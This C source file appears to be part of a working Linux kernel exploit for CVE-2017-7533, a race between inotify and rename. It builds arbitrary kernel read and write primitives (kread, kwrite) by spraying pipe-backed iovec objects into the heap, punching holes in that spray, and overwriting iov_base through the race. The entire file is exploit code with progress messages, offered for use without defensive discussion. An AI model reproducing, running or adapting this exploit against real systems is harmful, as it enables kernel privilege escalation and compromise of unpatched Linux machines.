#include "conf.h"
#include "types.h"


extern void *t_spray_iovec_to_read(void *);
extern void *t_spray_iovec_to_write(void *);
extern void *t_inotify_event(void *);
extern void *t_rename_open(void *);

#define THREAD_BUFFER_SIZE(sz) ((sz) + IOVEC_SIZE - 1)

volatile int stop = 0;
uint8_t dummy[0x1000];


void *kread(void *addr, size_t size, bool *success) {
    *success = false;

    if (size < 1) {
        return NULL;
    }

    pthread_t iovec_thread[IOVEC_THREADS];
    pthread_t notify_thread[2];
    pthread_t rename_thread;

    iovec_thread_args *args = calloc(IOVEC_THREADS, sizeof(iovec_thread_args));

    uint64_t *rename_args = calloc(2, 8);
    uint8_t  *val_test = calloc(1, THREAD_BUFFER_SIZE(size));
    uint8_t  *ret = calloc(1, size);

    rename_args[0] = (uint64_t)addr;
    rename_args[1] = (uint64_t)size;

    // 1. spray iovec objects (size=0xA0 ; kmalloc-192)
    printf("[*] Spraying iovec objects ... ");

    for (int i=0 ; i<IOVEC_THREADS ; i++) {
        if (pipe(args[i].fd) == -1) {
            perror("pipe");
            exit(EXIT_FAILURE);
        }

        if (fcntl(args[i].fd[0], F_SETPIPE_SZ, 0x1000) != 0x1000) {
            perror("fcntl (F_SETPIPE_SZ)");
            exit(EXIT_FAILURE);
        }

        args[i].thread_id = i;
        args[i].buf = calloc(1, THREAD_BUFFER_SIZE(size));
        memset(args[i].buf, 0x41, THREAD_BUFFER_SIZE(size));

        args[i].stack[0].iov_base = args[i].buf;
        args[i].stack[0].iov_len  = size;

        for (int j=1 ; j<IOVEC_SIZE ; j++) {
            args[i].stack[j].iov_base = args[i].buf + size + (j-1);
            args[i].stack[j].iov_len  = 1;
        }

        write(args[i].fd[1], dummy, 0x1000);    // block pipe
        pthread_create(&iovec_thread[i], NULL, t_spray_iovec_to_read, &args[i]);
    }

    printf("done.\n");

    // 2. read from halves of pipes to make holes
    //    note that fd is closed after thread join, this is to prevent EBADF.
    //    the size of val_test is THREAD_BUFFER_SIZE(size) instead of size,
    //    it is because the comparison gets better in this case. 
    printf("[*] Releasing iovec objects ... ");

    for (int i=0 ; i<IOVEC_THREADS ; i+=2) {
        if (read(args[i].fd[0], dummy, 0x1000) == -1) {
            perror("read");
            exit(EXIT_FAILURE);
        }

        if (read(args[i].fd[0], val_test, size) == -1) {
            perror("read");
        }

        assert(PTR_DEREF(val_test, 64) == 0x4141414141414141);

        pthread_join(iovec_thread[i], NULL);
        free(args[i].buf);
        close(args[i].fd[0]);
        close(args[i].fd[1]);
    }

    printf("done.\n");

    // 3. fill holes with struct inotify_event_info objects
    //    CVE-2017-7533: win race between inotify_handle_event vs. vfs_rename
    //    exploit the vulnerability to overwrite iov_base
    printf("[*] Trying overwriting iov_base of iovec objects ... \n");

    system("rm -rf test_dir ; mkdir test_dir");
    system("touch " DIR_TEST "/" FILE_SHORT_NAME);

    for (int i=0 ; i<2 ; i++) {
        pthread_create(&notify_thread[i], NULL, t_inotify_event, NULL);
    }

    pthread_create(&rename_thread, NULL, t_rename_open, rename_args);
    pthread_join(rename_thread, NULL);

    for (int i=0 ; i<2 ; i++) {
        pthread_join(notify_thread[i], NULL);
    }

    printf("    done.\n");

    // 4. read data
    printf("[*] Reading from iovec buffers ... ");

    for (int i=1 ; i<IOVEC_THREADS ; i+=2) {
        if (read(args[i].fd[0], dummy, 0x1000) == -1) {
            perror("read");
            exit(EXIT_FAILURE);
        }

        if (read(args[i].fd[0], val_test, size) == -1) {
            perror("read");
            exit(EXIT_FAILURE);
        }

        // if iov_base is successfully overwritten, the value of val_test won't be AAAAAAAA.
        if (PTR_DEREF(val_test, 64) != 0x4141414141414141uLL) {
            if (!*success) {
                memcpy(ret, val_test, size);
                *success = true;
            }
        }

        pthread_join(iovec_thread[i], NULL);
        free(args[i].buf);
        close(args[i].fd[0]);
        close(args[i].fd[1]);
    }

    printf("done.\n");

    free(val_test);
    free(args);

    return PTR(ret);
}

void kwrite(void *addr, void *wbuf, size_t size, bool *success) {
    *success = false;

    if (size < 1) {
        return;
    }

    pthread_t iovec_thread[IOVEC_THREADS];
    pthread_t notify_thread[4];
    pthread_t rename_thread;

    iovec_thread_args *args = calloc(IOVEC_THREADS, sizeof(iovec_thread_args));

    uint64_t *rename_args = calloc(2, 8);
    uint8_t  *val_test = calloc(1, THREAD_BUFFER_SIZE(size));

    rename_args[0] = (uint64_t)addr;
    rename_args[1] = (uint64_t)size;
    memcpy(val_test, wbuf, size);
    memset(val_test+size, 0x41, THREAD_BUFFER_SIZE(size));

    // 1. setup iovec objects (size=0xA0 ; kmalloc-192)
    printf("[*] Spraying iovec objects ... ");

    for (int i=0 ; i<IOVEC_THREADS ; i++) {
        if (pipe(args[i].fd) == -1) {
            perror("pipe");
            exit(EXIT_FAILURE);
        }

        if (fcntl(args[i].fd[0], F_SETPIPE_SZ, 0x1000) != 0x1000) {
            perror("fcntl (F_SETPIPE_SZ)");
            exit(EXIT_FAILURE);
        }

        args[i].thread_id = i;
        args[i].success = false;
        args[i].buf = calloc(1, THREAD_BUFFER_SIZE(size));
        memset(args[i].buf, 0x41, THREAD_BUFFER_SIZE(size));

        args[i].stack[0].iov_base = args[i].buf;
        args[i].stack[0].iov_len  = size;

        for (int j=1 ; j<IOVEC_SIZE ; j++) {
            args[i].stack[j].iov_base = args[i].buf + size + (j-1);
            args[i].stack[j].iov_len  = 1;
        }

        pthread_create(&iovec_thread[i], NULL, t_spray_iovec_to_write, &args[i]);
    }

    printf("done.\n");

    // 2. write to halves of pipes to make holes
    //    note that fd is closed after thread join, this is to prevent EBADF.
    printf("[*] Releasing iovec objects ... ");

    for (int i=0 ; i<IOVEC_THREADS ; i+=2) {
        if (write(args[i].fd[1], val_test, THREAD_BUFFER_SIZE(size)) == -1) {
            perror("write");
        }

        pthread_join(iovec_thread[i], NULL);
        free(args[i].buf);
        close(args[i].fd[0]);
        close(args[i].fd[1]);
    }

    printf("done.\n");

    // 3. fill holes with struct inotify_event_info objects
    //    CVE-2017-7533: win race between inotify_handle_event vs. vfs_rename
    //    exploit the vulnerability to overwrite iov_base
    printf("[*] Trying overwriting iov_base of iovec objects ... \n");

    system("rm -rf test_dir ; mkdir test_dir");
    system("touch " DIR_TEST "/" FILE_SHORT_NAME);

    for (int i=0 ; i<2 ; i++) {
        pthread_create(&notify_thread[i], NULL, t_inotify_event, NULL);
    }

    pthread_create(&rename_thread, NULL, t_rename_open, rename_args);
    pthread_join(rename_thread, NULL);

    for (int i=0 ; i<2 ; i++) {
        pthread_join(notify_thread[i], NULL);
    }

    printf("    done.\n");

    // 4. write data
    printf("[*] Writing to iovec buffers ... ");

    for (int i=1 ; i<IOVEC_THREADS ; i+=2) {
        if (write(args[i].fd[1], val_test, THREAD_BUFFER_SIZE(size)) == -1) {
            perror("write");
        }

        pthread_join(iovec_thread[i], NULL);
        free(args[i].buf);
        close(args[i].fd[0]);
        close(args[i].fd[1]);

        *success |= args[i].success;
    }

    printf("done.\n");

    free(val_test);
    free(args);
}